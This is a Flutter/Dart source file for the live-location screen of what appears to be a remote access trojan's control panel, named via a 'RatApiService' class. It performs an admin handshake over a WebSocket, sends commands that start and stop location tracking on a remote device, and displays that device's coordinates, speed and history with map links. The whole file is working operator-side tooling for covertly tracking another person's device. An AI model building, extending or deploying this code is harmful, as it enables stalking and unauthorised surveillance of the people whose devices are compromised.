import '../services/api_config.dart';
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:web_socket_channel/io.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'api_service.dart';
import 'constants.dart';

const _kBg    = Color(0xFF111827);
const _kCard  = Color(0xFF1F2937);
const _kBlue  = Color(0xFF3B82F6);
const _kCyan  = Color(0xFF06B6D4);
const _kGreen = Color(0xFF10B981);
const _kRed   = Color(0xFFEF4444);
const _kSub   = Color(0xFF9CA3AF);

class LiveLocationScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const LiveLocationScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<LiveLocationScreen> createState() => _LiveLocationScreenState();
}

class _LiveLocationScreenState extends State<LiveLocationScreen> {
  late RatApiService _api;
  bool _isTracking = false;
  String _status = 'Not tracking';
  List<dynamic> _history = [];
  Timer? _pollTimer;
  WebSocketChannel? _channel;
  StreamSubscription? _sub;

  @override
  void initState() { super.initState(); _api = RatApiService(widget.sessionKey); _load(); }

  @override
  void dispose() { _pollTimer?.cancel(); _closeWs(); super.dispose(); }

  void _closeWs() { _sub?.cancel(); _channel?.sink.close(); _channel = null; }

  Future<void> _load() async {
    try {
      final r = await _api.getLiveLoc(widget.deviceId);
      final h = r['history'];
      if (h is List) setState(() => _history = h);
    } catch (_) {}
  }

  Future<void> _start() async {
    setState(() { _isTracking = true; _status = 'Connecting...'; });
    try {
      _channel = IOWebSocketChannel.connect(Uri.parse(RatConstants.wsUrl), headers: ApiConfig.getHeaders());
      _channel!.sink.add('ADMIN_HANDSHAKE:${widget.sessionKey}:${widget.deviceId}');
      _sub = _channel!.stream.listen((msg) {
        if (msg is String && msg.startsWith('VLIVE_LOC:')) {
          final data = jsonDecode(msg.substring(10));
          setState(() { _history.insert(0, data); if (_history.length > 100) _history = _history.take(100).toList(); });
        }
      });
      await _api.sendCommand(widget.deviceId, 'LIVE_LOC_START');
      _pollTimer = Timer.periodic(const Duration(seconds: 30), (_) => _load());
      setState(() => _status = 'Live tracking active');
    } catch (e) { setState(() => _status = 'Error: $e'); }
  }

  Future<void> _stop() async {
    _pollTimer?.cancel();
    _closeWs();
    await _api.sendCommand(widget.deviceId, 'LIVE_LOC_STOP');
    setState(() { _isTracking = false; _status = 'Stopped'; });
  }

  Future<void> _openMaps(String lat, String lng) async {
    await launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication);
  }

  @override
  Widget build(BuildContext context) {
    final latest = _history.isNotEmpty ? _history.first : null;
    return Scaffold(
      backgroundColor: _kBg,
      body: SafeArea(
        child: Column(children: [
          // Header
          Container(
            padding: const EdgeInsets.fromLTRB(16, 12, 16, 12),
            decoration: BoxDecoration(color: _kCard.withOpacity(0.95), border: Border(bottom: BorderSide(color: _kBlue.withOpacity(0.2)))),
            child: Row(children: [
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
              ),
              const SizedBox(width: 12),
              Container(
                width: 8, height: 8,
                decoration: BoxDecoration(color: _isTracking ? _kGreen : _kSub, shape: BoxShape.circle, boxShadow: _isTracking ? [BoxShadow(color: _kGreen, blurRadius: 6)] : []),
              ),
              const SizedBox(width: 10),
              Text(_isTracking ? 'Live Tracking' : 'Location Tracker', style: TextStyle(color: _isTracking ? _kGreen : Colors.white, fontWeight: FontWeight.w700, fontSize: 16)),
              const Spacer(),
              GestureDetector(
                onTap: _load,
                child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.refresh_rounded, color: Colors.white70, size: 18)),
              ),
            ]),
          ),

          // Coords card
          Container(
            margin: const EdgeInsets.all(14),
            padding: const EdgeInsets.all(18),
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [_kCard.withOpacity(0.95), _kBg.withOpacity(0.95)]),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: (_isTracking ? _kGreen : _kBlue).withOpacity(_isTracking ? 0.5 : 0.2), width: _isTracking ? 1.5 : 1),
              boxShadow: _isTracking ? [BoxShadow(color: _kGreen.withOpacity(0.15), blurRadius: 20)] : [],
            ),
            child: Column(children: [
              Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(Icons.location_on_rounded, color: _isTracking ? _kGreen : _kBlue, size: 26),
                const SizedBox(width: 8),
                Flexible(child: Text(latest != null ? '${latest['lat']}, ${latest['lng']}' : '---, ---', style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold), textAlign: TextAlign.center)),
              ]),
              const SizedBox(height: 14),
              Row(mainAxisAlignment: MainAxisAlignment.spaceAround, children: [
                _chip(Icons.my_location_rounded, 'Accuracy', '${latest?['acc'] ?? '--'}m'),
                _chip(Icons.terrain_rounded, 'Altitude', '${latest?['alt'] ?? '--'}m'),
                _chip(Icons.speed_rounded, 'Speed', '${latest?['spd'] ?? '--'} m/s'),
              ]),
              if (latest != null) ...[
                const SizedBox(height: 14),
                GestureDetector(
                  onTap: () => _openMaps(latest['lat'].toString(), latest['lng'].toString()),
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 12),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10)),
                    child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                      Icon(Icons.map_rounded, color: Colors.white, size: 18),
                      SizedBox(width: 8),
                      Text('Open in Google Maps', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600)),
                    ]),
                  ),
                ),
              ],
            ]),
          ),

          // Track button
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 14),
            child: GestureDetector(
              onTap: _isTracking ? _stop : _start,
              child: Container(
                width: double.infinity,
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  gradient: LinearGradient(colors: _isTracking ? [_kRed, const Color(0xFFDC2626)] : [_kGreen, const Color(0xFF059669)]),
                  borderRadius: BorderRadius.circular(12),
                  boxShadow: [BoxShadow(color: (_isTracking ? _kRed : _kGreen).withOpacity(0.35), blurRadius: 14)],
                ),
                child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  Icon(_isTracking ? Icons.stop_rounded : Icons.play_arrow_rounded, color: Colors.white, size: 20),
                  const SizedBox(width: 8),
                  Text(_isTracking ? 'Stop Tracking' : 'Start Live Tracking', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 14)),
                ]),
              ),
            ),
          ),
          const SizedBox(height: 12),

          // History header
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            child: Row(children: [
              const Icon(Icons.history_rounded, color: _kSub, size: 16),
              const SizedBox(width: 6),
              Text('History (${_history.length})', style: const TextStyle(color: _kSub, fontSize: 12, fontWeight: FontWeight.w600)),
            ]),
          ),
          const SizedBox(height: 8),

          // History list
          Expanded(
            child: _history.isEmpty
              ? const Center(child: Text('No location history', style: TextStyle(color: _kSub, fontSize: 13)))
              : ListView.builder(
                  padding: const EdgeInsets.symmetric(horizontal: 14),
                  physics: const BouncingScrollPhysics(),
                  itemCount: _history.length,
                  itemBuilder: (_, i) {
                    final loc = _history[i];
                    final ts = loc['ts'] != null ? DateTime.fromMillisecondsSinceEpoch(int.tryParse(loc['ts'].toString()) ?? 0) : null;
                    return Container(
                      margin: const EdgeInsets.only(bottom: 6),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [_kCard.withOpacity(0.9), _kBg.withOpacity(0.9)]),
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: i == 0 ? _kGreen.withOpacity(0.4) : Colors.white.withOpacity(0.04)),
                      ),
                      child: ListTile(
                        dense: true,
                        leading: Icon(i == 0 ? Icons.location_on_rounded : Icons.location_on_outlined, color: i == 0 ? _kGreen : _kSub, size: 18),
                        title: Text('${loc['lat']}, ${loc['lng']}', style: TextStyle(color: i == 0 ? Colors.white : Colors.white70, fontSize: 12)),
                        subtitle: ts != null ? Text('${ts.hour}:${ts.minute.toString().padLeft(2,'0')} · acc ${loc['acc']}m', style: const TextStyle(color: _kSub, fontSize: 10)) : null,
                        trailing: GestureDetector(
                          onTap: () => _openMaps(loc['lat'].toString(), loc['lng'].toString()),
                          child: Container(padding: const EdgeInsets.all(6), decoration: BoxDecoration(color: _kBlue.withOpacity(0.1), borderRadius: BorderRadius.circular(6)), child: const Icon(Icons.open_in_browser_rounded, color: _kBlue, size: 14)),
                        ),
                      ),
                    );
                  },
                ),
          ),
        ]),
      ),
    );
  }

  Widget _chip(IconData icon, String label, String value) => Column(children: [
    Icon(icon, color: _isTracking ? _kGreen : _kBlue, size: 16),
    const SizedBox(height: 4),
    Text(value, style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w700)),
    Text(label, style: const TextStyle(color: _kSub, fontSize: 10)),
  ]);
}
